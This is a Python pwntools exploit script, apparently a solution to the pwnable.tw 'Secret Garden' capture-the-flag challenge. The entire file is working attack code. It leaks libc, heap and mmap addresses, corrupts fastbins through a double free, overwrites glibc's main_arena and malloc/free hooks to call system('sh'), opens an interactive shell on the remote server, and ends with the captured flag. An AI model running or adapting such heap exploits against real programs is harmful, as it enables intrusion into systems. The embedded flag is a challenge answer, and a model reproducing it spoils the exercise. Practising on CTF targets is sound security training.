#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
from IPython import embed

context.arch = 'amd64'

r = remote('chall.pwnable.tw', 10203)
#r = remote('127.0.0.1', 7122)
library = ELF('./libc.so.6')
#library = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def menu():
	x = r.recvuntil('Your choice :')
	if 'Invalid' in x:
		print 'jizz'
		exit(-1)

def rraise(l, name, color, noline=0, wmenu=1):
	if wmenu: menu()
	r.sendline('1')
	r.recvuntil('of the name :')
	r.sendline(str(l))
	r.recvuntil('name of flower :')
	if noline: r.send(name)
	else: r.sendline(name)
	r.recvuntil('color of the flower :')
	r.sendline(color)

def visit():
	menu()
	r.sendline('2')
	return r.recvuntil('Secret Garden', drop=True)

def remove(idx):
	menu()
	r.sendline('3')
	r.recvuntil('from the garden:')
	r.sendline(str(idx))

def clean():
	menu()
	r.sendline('4')
	
# junk
rraise(8, 'a'*7, 'a'*22)

# leak libc
sz = 152
rraise(sz, 'b'*(sz-1), 'b'*22)
rraise(sz, 'c'*(sz-1), 'c'*22)
remove(1)
clean()
rraise(sz, 'd'*7, 'd'*22)
x = visit()
x = x.split('\n')[4]
#libc = u64(x.ljust(8, '\0')) - 0x3c4b78 	#local
libc = u64(x.ljust(8, '\0')) - 0x3c4b78 + 0x1000
#magic = libc+0x4526a
#magic = libc+0xcc543
#magic = libc+0xcc618
#magic = libc+0xef6c4
#magic = libc+0xf0567
magic = libc+0xf5b10
system = libc+library.symbols['system']
print 'libc base:', hex(libc)
print 'magic:', hex(magic)
print 'system:', hex(system)

# leak heap
rraise(1122, 'A', 'A')
rraise(1122, 'A', 'A')
rraise(1122, 'A', 'A')
remove(3)
remove(4)
clean()
rraise(1122, 'A'*8, 'A')
x = visit()
x = '\x00'+x.split('\n')[10]
heap = u64(x.ljust(8, '\0')) - 0x1200
print 'heap:', hex(heap)

# leak environ
rraise(0x21000, 'A', 'A')
rraise(0x21000, 'A', 'A')
remove(4)
remove(6)
clean()
rraise(40, 'A'*7, 'A')
x = visit()
x = x.split('\n')[13]
mmap = u64(x.ljust(8, '\0')) - 0x10
environ = mmap + 0x26100
print 'mmap:', hex(mmap)
print 'environ:', hex(environ)
#embed()


# fastbin corruption
#embed()
#__malloc_hook = libc+0x3c4af0-0x8+5
#main_arena = libc+0x3c4af0+0x30
T = library.symbols['__malloc_hook']-0x20
__malloc_hook = libc+T-0x8+5
main_arena = libc+T+0x30
print 'main_arena:', hex(main_arena)
print '__malloc_hook:', hex(__malloc_hook)

rraise(100, 'A', 'A')
rraise(100, 'B', 'B')
remove(6)
remove(7)
remove(6)
rraise(100, flat(__malloc_hook), 'B')
rraise(100, 'B', 'B')
rraise(100, 'B', 'B')

#mov rax, rbx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
#gadget = libc+0x79a9c
#rraise(100, 'pad'+flat(0xcafe, 0xcafe, gadget), 'B')

# corrupt main_arena
first = main_arena+0xbf0+5
second = main_arena+0xbf0+5+3+0x10
print 'first:', hex(first)

rraise(100, 'pad'+flat(
	[0]*7,
	#[0]*2,
	0x5f,
	main_arena+16,
	0x7f,
	main_arena+32,
), 'B')

# forge top chunk
__free_hook = libc+0x3c67a8
print '__free_hook:', hex(__free_hook)
rraise(100, flat(
	first,
	#main_arena+32,
	[0]*4,
	second,
	#__free_hook-0x20,
), 'B')

#menu()
#r.sendline('')

'''
# leak stack
rraise(100, 'pad'+'X'*31, 'A')
x = visit()
x = x.split('\n')[32]
stack = u64(x.ljust(8, '\0')) - 0x20698
stack = stack + 0x20578
stack_chunk = stack - 0xa0 + 5 - 0x8
print 'stack:', hex(stack)
print 'stack_chunk', hex(stack_chunk)
#embed()

# corrupt main_arena top_chunk
rraise(72, flat(
	main_arena+16,
	0x7f,
	stack_chunk,
	#main_arena+32,
	#[0]*4,
	#top_chunk,
), 'A')
'''

rraise(100, 'pad'+flat(0, 0x1ffa1), 'A')

# empty fastbins
rraise(72, flat([
	0, 0,
	__malloc_hook,
]), 'A', noline=1)
#rraise(100, 'pad'+flat([0]*4, 0x0000000100000000, [0]*6), 'A', noline=1)
rraise(100, 'pad'+flat([0]*4, 0x0000000000000000, [0]*6), 'A', noline=1)

# malloc free hook
#rraise(4400, 'sh'.ljust(0x1070, '\0')+flat(system), 'a', wmenu=0)

rraise(4100, 'a', 'a')
rraise(1200, 'sh'.ljust(12*8, '\0')+flat(system), 'a')
remove(17)


r.interactive()

# FLAG{FastBiN_C0rruption_t0_BUrN_7H3_G4rd3n}
